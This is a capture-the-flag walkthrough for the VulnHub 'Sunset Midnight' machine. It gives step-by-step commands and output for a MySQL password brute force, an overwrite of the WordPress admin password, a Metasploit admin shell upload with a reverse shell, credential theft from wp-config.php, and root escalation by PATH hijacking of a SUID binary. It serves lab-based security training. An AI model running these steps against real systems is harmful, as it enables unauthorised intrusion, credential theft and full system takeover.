
# Sunset Midnight - CTF

Available on VulnHub: https://www.vulnhub.com/entry/sunset-midnight,517/


## IP Discovery

```
$ sudo netdiscover -r 192.168.1.0/16
```

```
Currently scanning: Finished!   |   Screen View: Unique Hosts

0 Captured ARP Req/Rep packets, from 0 hosts.   Total size: 0
_____________________________________________________________________________
 IP            At MAC Address     Count     Len  MAC Vendor / Hostname
-----------------------------------------------------------------------------
xxx.xxx.x.x     xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
192.168.1.103   08:00:27:5d:f9:23      1      60  PCS Systemtechnik GmbH
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```

## Port Scanning

```
$ nmap -AT4 -p- 192.168.1.103
```

```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-19 23:17 -03
Nmap scan report for 192.168.1.103
Host is up (0.0041s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 9c:fe:0b:8b:8d:15:e7:72:7e:3c:23:e5:86:55:51:2d (RSA)
|   256 fe:eb:ef:5d:40:e7:06:67:9b:63:67:f8:d9:7e:d3:e2 (ECDSA)
|_  256 35:83:68:2c:33:8b:b4:6c:24:21:20:0d:52:ed:cd:16 (ED25519)
80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Did not follow redirect to http://sunset-midnight/
3306/tcp open  mysql   MySQL 5.5.5-10.3.22-MariaDB-0+deb10u1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.3.22-MariaDB-0+deb10u1
|   Thread ID: 15
|   Capabilities flags: 63486
|   Some Capabilities: IgnoreSigpipes, Speaks41ProtocolNew, FoundRows, InteractiveClient, SupportsCompression, LongColumnFlag, Support41Auth, Speaks41ProtocolOld, SupportsTransactions, SupportsLoadDataLocal, ConnectWithDatabase, ODBCClient, IgnoreSpaceBeforeParenthesis, DontAllowDatabaseTableColumn, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: l<&Fnv)c:5=o;tZD(7{)
|_  Auth Plugin Name: mysql_native_password
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.03 seconds
```

## Web Analysis

Update `/etc/hosts` with **sunset-midnight** DNS
```
192.168.1.103 sunset-midnight
```

```
$ dirb http://192.168.1.103

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Fri Feb 19 23:19:11 2021
URL_BASE: http://192.168.1.103/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.1.103/ ----
+ http://192.168.1.103/0 (CODE:200|SIZE:61796)                                                                       
==> DIRECTORY: http://192.168.1.103/about/                                                                           
==> DIRECTORY: http://192.168.1.103/About/                                                                           
+ http://192.168.1.103/admin (CODE:302|SIZE:0)                                                                       
+ http://192.168.1.103/atom (CODE:301|SIZE:0)                                                                        
==> DIRECTORY: http://192.168.1.103/blog/                                                                            
==> DIRECTORY: http://192.168.1.103/Blog/                                                                            
==> DIRECTORY: http://192.168.1.103/coffee/                                                                          
+ http://192.168.1.103/comment-page-1 (CODE:301|SIZE:0)                                                              
==> DIRECTORY: http://192.168.1.103/contact/                                                                         
==> DIRECTORY: http://192.168.1.103/Contact/                                                                         
+ http://192.168.1.103/dashboard (CODE:302|SIZE:0)                                                                   
+ http://192.168.1.103/embed (CODE:200|SIZE:18968)                                                                   
+ http://192.168.1.103/favicon.ico (CODE:302|SIZE:0)                                                                 
==> DIRECTORY: http://192.168.1.103/feed/                                                                            
+ http://192.168.1.103/home (CODE:200|SIZE:61796)                                                                    
+ http://192.168.1.103/Home (CODE:200|SIZE:61796)                                                                    
+ http://192.168.1.103/index.php (CODE:200|SIZE:61796)                                                               
+ http://192.168.1.103/login (CODE:302|SIZE:0)                                                                       
+ http://192.168.1.103/page1 (CODE:200|SIZE:61796)                                                                   
+ http://192.168.1.103/page2 (CODE:200|SIZE:61840)                                                                   
+ http://192.168.1.103/rdf (CODE:301|SIZE:0)                                                                         
+ http://192.168.1.103/robots.txt (CODE:200|SIZE:67)                                                                 
+ http://192.168.1.103/rss (CODE:301|SIZE:0)                                                                         
+ http://192.168.1.103/rss2 (CODE:301|SIZE:0)                                                                        
+ http://192.168.1.103/server-status (CODE:403|SIZE:278)                                                             
==> DIRECTORY: http://192.168.1.103/wp-admin/                                                                        
==> DIRECTORY: http://192.168.1.103/wp-content/                                                                      
==> DIRECTORY: http://192.168.1.103/wp-includes/                                                                     
+ http://192.168.1.103/xmlrpc.php (CODE:405|SIZE:42)
```

```
$ nikto -h http://192.168.1.103

- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.1.103
+ Target Hostname:    192.168.1.103
+ Target Port:        80
+ Start Time:         2021-02-19 23:19:23 (GMT-3)
---------------------------------------------------------------------------
+ Server: Apache/2.4.38 (Debian)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ Uncommon header 'x-redirect-by' found, with contents: WordPress
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Root page / redirects to: http://sunset-midnight/
+ Uncommon header 'link' found, with contents: <http://sunset-midnight/wp-json/>; rel="https://api.w.org/"
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Entry '/wp-admin/' in robots.txt returned a non-forbidden or redirect HTTP code (302)
+ "robots.txt" contains 2 entries which should be manually viewed.
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ OSVDB-3092: /home/: This might be interesting...
+ OSVDB-3233: /icons/README: Apache default file found.
+ /wp-links-opml.php: This WordPress script reveals the installed version.
+ OSVDB-3092: /license.txt: License file found may identify site software.
+ /wp-app.log: Wordpress' wp-app.log may leak application/system details.
+ /wordpresswp-app.log: Wordpress' wp-app.log may leak application/system details.
+ /wordpress: A Wordpress installation was found.
+ Cookie wordpress_test_cookie created without the httponly flag
+ OSVDB-3268: /wp-content/uploads/: Directory indexing found.
+ /wp-content/uploads/: Wordpress uploads directory is browsable. This may reveal sensitive information
+ /wp-login.php: Wordpress login found
+ 7919 requests: 0 error(s) and 19 item(s) reported on remote host
+ End Time:           2021-02-19 23:24:22 (GMT-3) (299 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

## WordPress Analysis

```
$ wpscan -e ap,at,u --url http://sunset-midnight
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.15
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://sunset-midnight/ [192.168.1.103]
[+] Started: Fri Feb 19 23:23:30 2021

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.38 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://sunset-midnight/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://sunset-midnight/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] WordPress readme found: http://sunset-midnight/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://sunset-midnight/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://sunset-midnight/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).
 | Found By: Rss Generator (Passive Detection)
 |  - http://sunset-midnight/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>
 |  - http://sunset-midnight/comments/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>

[+] WordPress theme in use: twentyseventeen
 | Location: http://sunset-midnight/wp-content/themes/twentyseventeen/
 | Last Updated: 2020-12-09T00:00:00.000Z
 | Readme: http://sunset-midnight/wp-content/themes/twentyseventeen/readme.txt
 | [!] The version is out of date, the latest version is 2.5
 | Style URL: http://sunset-midnight/wp-content/themes/twentyseventeen/style.css?ver=20190507
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 2.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://sunset-midnight/wp-content/themes/twentyseventeen/style.css?ver=20190507, Match: 'Version: 2.3'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] simply-poll-master
 | Location: http://sunset-midnight/wp-content/plugins/simply-poll-master/
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 1.5 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://sunset-midnight/wp-content/plugins/simply-poll-master/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://sunset-midnight/wp-content/plugins/simply-poll-master/readme.txt

[+] Enumerating All Themes (via Passive and Aggressive Methods)
ETA: 00:0 Checking Known Locations - Time: 00:03:37 <=================================> (22141 / 22141) 100.00% Time: 00:03:37
[+] Checking Theme Versions (via Passive and Aggressive Methods)

[i] Theme(s) Identified:

[+] twentynineteen
 | Location: http://sunset-midnight/wp-content/themes/twentynineteen/
 | Last Updated: 2020-12-22T00:00:00.000Z
 | Readme: http://sunset-midnight/wp-content/themes/twentynineteen/readme.txt
 | [!] The version is out of date, the latest version is 1.9
 | Style URL: http://sunset-midnight/wp-content/themes/twentynineteen/style.css
 | Style Name: Twenty Nineteen
 | Style URI: https://wordpress.org/themes/twentynineteen/
 | Description: Our 2019 default theme is designed to show off the power of the block editor. It features custom sty...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://sunset-midnight/wp-content/themes/twentynineteen/, status: 500
 |
 | Version: 1.5 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://sunset-midnight/wp-content/themes/twentynineteen/style.css, Match: 'Version: 1.5'

[+] twentyseventeen
 | Location: http://sunset-midnight/wp-content/themes/twentyseventeen/
 | Last Updated: 2020-12-09T00:00:00.000Z
 | Readme: http://sunset-midnight/wp-content/themes/twentyseventeen/readme.txt
 | [!] The version is out of date, the latest version is 2.5
 | Style URL: http://sunset-midnight/wp-content/themes/twentyseventeen/style.css
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By:
 |  Urls In 404 Page (Passive Detection)
 |  Known Locations (Aggressive Detection)
 |   - http://sunset-midnight/wp-content/themes/twentyseventeen/, status: 500
 |
 | Version: 2.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://sunset-midnight/wp-content/themes/twentyseventeen/style.css, Match: 'Version: 2.3'

[+] twentytwenty
 | Location: http://sunset-midnight/wp-content/themes/twentytwenty/
 | Last Updated: 2020-12-09T00:00:00.000Z
 | Readme: http://sunset-midnight/wp-content/themes/twentytwenty/readme.txt
 | [!] The version is out of date, the latest version is 1.6
 | Style URL: http://sunset-midnight/wp-content/themes/twentytwenty/style.css
 | Style Name: Twenty Twenty
 | Style URI: https://wordpress.org/themes/twentytwenty/
 | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://sunset-midnight/wp-content/themes/twentytwenty/, status: 500
 |
 | Version: 1.2 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://sunset-midnight/wp-content/themes/twentytwenty/style.css, Match: 'Version: 1.2'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <=======================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://sunset-midnight/wp-json/wp/v2/users/?per_page=100&page=1
 |  Oembed API - Author URL (Aggressive Detection)
 |   - http://sunset-midnight/wp-json/oembed/1.0/embed?url=http://sunset-midnight/&format=json
 |  Rss Generator (Aggressive Detection)
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Fri Feb 19 23:27:19 2021
[+] Requests Done: 22214
[+] Cached Requests: 20
[+] Data Sent: 5.8 MB
[+] Data Received: 23.158 MB
[+] Memory used: 298.246 MB
[+] Elapsed time: 00:03:48
```

I did not find nothing with Web Analysis result.

## MySQL Brute Forcing

```
$ hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.1.103 -f -t 32 mysql

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-02-19 23:47:05
[INFO] Reduced number of tasks to 4 (mysql does not like many parallel connections)
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking mysql://192.168.1.103:3306/
[3306][mysql] host: 192.168.1.103   login: root   password: robert
[STATUS] attack finished for 192.168.1.103 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-02-19 23:47:08
```

Credentials:
* User: **root**
* Pass: **robert**

## MySQL Access

```
$ mysql -h 192.168.1.103 -u root -p
Enter password: robert

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 125182
Server version: 10.3.22-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> 
```

Looking DB content
```
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| wordpress_db       |
+--------------------+

MariaDB [(none)]> use wordpress_db;
Database changed

MariaDB [wordpress_db]> show tables;
+------------------------+
| Tables_in_wordpress_db |
+------------------------+
| wp_commentmeta         |
| wp_comments            |
| wp_links               |
| wp_options             |
| wp_postmeta            |
| wp_posts               |
| wp_sp_polls            |
| wp_term_relationships  |
| wp_term_taxonomy       |
| wp_termmeta            |
| wp_terms               |
| wp_usermeta            |
| wp_users               |
+------------------------+

MariaDB [wordpress_db]> SELECT user_login,user_pass FROM wp_users;
+------------+------------------------------------+
| user_login | user_pass                          |
+------------+------------------------------------+
| admin      | $P$BaWk4oeAmrdn453hR6O6BvDqoF9yy6/ |
+------------+------------------------------------+
```

## Cracking Hash

I tried to crack the **admin**'s password hash, but failed...\
So I changed the **admin**'s password on DB.
```
$ echo -n "password" | md5sum
5f4dcc3b5aa765d61d8327deb882cf99
```

```
MariaDB [wordpress_db]> UPDATE wp_users SET user_pass='5f4dcc3b5aa765d61d8327deb882cf99' WHERE ID=1;
Query OK, 1 row affected (0.005 sec)
Rows matched: 1  Changed: 1  Warnings: 0

MariaDB [wordpress_db]> SELECT user_login,user_pass FROM wp_users;
+------------+----------------------------------+
| user_login | user_pass                        |
+------------+----------------------------------+
| admin      | 5f4dcc3b5aa765d61d8327deb882cf99 |
+------------+----------------------------------+
```

## WordPress Access

Now we are able to login in WordPress admin page.
```
[ GET ] http://sunset-midnight/wp-admin/

User: admin
Pass: password
```

## Exploitation

```
$ msfconsole

msf6 > use unix/webapp/wp_admin_shell_upload

msf6 exploit(unix/webapp/wp_admin_shell_upload) > set RHOSTS sunset-midnight
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set USERNAME admin
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set PASSWORD password
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set WPCHECK false

msf6 exploit(unix/webapp/wp_admin_shell_upload) > exploit

[*] Started reverse TCP handler on 192.168.1.189:4444 
[*] Authenticating with WordPress using admin:password...
[+] Authenticated with WordPress
[*] Preparing payload...
[*] Uploading payload...
[*] Executing the payload at /wp-content/plugins/QpavfLYgzX/RVIaihyNlQ.php...
[*] Sending stage (39282 bytes) to 192.168.1.103
[*] Meterpreter session 1 opened (192.168.1.189:4444 -> 192.168.1.103:44344) at 2021-02-20 00:23:35 -0300
[+] Deleted RVIaihyNlQ.php
[+] Deleted QpavfLYgzX.php
[+] Deleted ../QpavfLYgzX

meterpreter > shell
python3 -c 'import pty;pty.spawn("/bin/bash")'

www-data@midnight:$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Privilege Escalation - jose

Looking into some configuration files, I found `jose`'s credentials.
```
www-data@midnight:/var/www/html/wordpress$ cat wp-config.php

<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/support/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress_db' );

/** MySQL database username */
define( 'DB_USER', 'jose' );

/** MySQL database password */
define( 'DB_PASSWORD', '645dc5a8871d2a4269d4cbe23f6ae103' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         '9F#)Pk/=&SyQ/>UVRBXx$}e&>G@(+m6L|_{Emur&fv&fO_+wbJ`-6QnE_7hI|Y<p');
define('SECURE_AUTH_KEY',  'p#Eh5#4W~p4-Iue2M)H/?[dp`BS;$7o~Kb%F?&S-Zv=rH#;U%`9G#VR`l^,8j$M+');
define('LOGGED_IN_KEY',    '0{YUw?X%j+ej-0du&FW@QkVP?b(#QsQfu[Q%<QS_Lpc1UI1|st:EJr)d*$g/iJ18');
define('NONCE_KEY',        '%)thH*l;)A^S#8WQ!8TKAnQ;uNXNKv<f.|PyYijgztda70y-4m~DTyqr^X!$JwX#');
define('AUTH_SALT',        '<Kd5.3^|yo:/fw2Y|PTb4!bU~5uRv7Z(n0;~jOXoO7MC]j/ICu[tY!)g4Oah-{oa');
define('SECURE_AUTH_SALT', 'dmYQvQ1Ap&z~JUHUaKR6]<rm7^ydGAp(/EH&+vrAi6cBpi?F7XKTc@Ahm:|h*wR;');
define('LOGGED_IN_SALT',   '5+Iw-;-j+2rD3WgRtSM`!zDb5I%LLU0]Awk-Cma:f4xrJv%k~/@+TthXY_[JpjfK');
define('NONCE_SALT',       'iDo3}y9z;@c~a)ZLT:7|.ZCp-0sK4>T1p&%MhGt_TUu+HFpPjn-no`:8sI0BA);y');

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://wordpress.org/support/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', false );

/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
	define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';
```

Credentials:
* User: **jose**
* Pass: **645dc5a8871d2a4269d4cbe23f6ae103**

```
www-data@midnight:/var/www/html/wordpress$ su jose
Password: 645dc5a8871d2a4269d4cbe23f6ae103

jose@midnight:/var/www/html/wordpress$ id
uid=1000(jose) gid=1000(jose) groups=1000(jose),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)
```

## Flag #1 - jose

```
jose@midnight:~$ cat user.txt 
956a9564aa5632edca7b745c696f6575
```

## Privilege Escalation - Root

Looking for SUID binaries, we can find an unusual binary: `/usr/bin/status`
```
jose@midnight:~$ find / -type f -perm -u=s 2>/dev/null

find / -type f -perm -u=s 2>/dev/null
/usr/bin/su
/usr/bin/sudo
/usr/bin/status     <<<<<
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/gpasswd
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
```

We can see that it calls `service ssh status` with relative `service` path.
```
jose@midnight:~$ strings /usr/bin/status
.
..
...
u/UH
[]A\A]A^A_
Status of the SSH server:
service ssh status             <<<<<
;*3$"
GCC: (Debian 8.3.0-6) 8.3.0
...
..
.
```

The idea is to redirect relative `service` command.\
The `service` binary is comming from `/usr/sbin`.\
We are able to redirect it editing the `PATH` environment to a modified `service` binary or script.
```
jose@midnight:~$ whereis service
service: /usr/sbin/service

jose@midnight:~$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

Creating a `service` script in `/tmp` directory with bash spawn command.
```
jose@midnight:~$ echo "/bin/bash" > /tmp/service
jose@midnight:~$ chmod +x /tmp/service
```

Now we need to add `/tmp` directory in `PATH` environment variable.\
It is important that it keep before the original `service` binary from `/usr/sbin`.\
So we just have to add `/tmp` folder in the start of `PATH`.
```
jose@midnight:~$ export PATH=/tmp:$PATH
```

So when `/usr/bin/status` run, the `service` that will be executed will be our script.
```
jose@midnight:~$ /usr/bin/status

root@midnight:~# id
uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth),1000(jose)
```

## Flah #2 - Root

```
root@midnight:/root# cat root.txt

          ___   ____
        /' --;^/ ,-_\     \ | /
       / / --o\ o-\ \\   --(_)--
      /-/-/|o|-|\-\\|\\   / | \
       '`  ` |-|   `` '
             |-|
             |-|O
             |-(\,__
          ...|-|\--,\_....
      ,;;;;;;;;;;;;;;;;;;;;;;;;,.
~,;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;,~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;,  ______   ---------   _____     ------

db2def9d4ddcb83902b884de39d426e6
Thanks for playing! - Felipe Winsnes (@whitecr0wz)
```
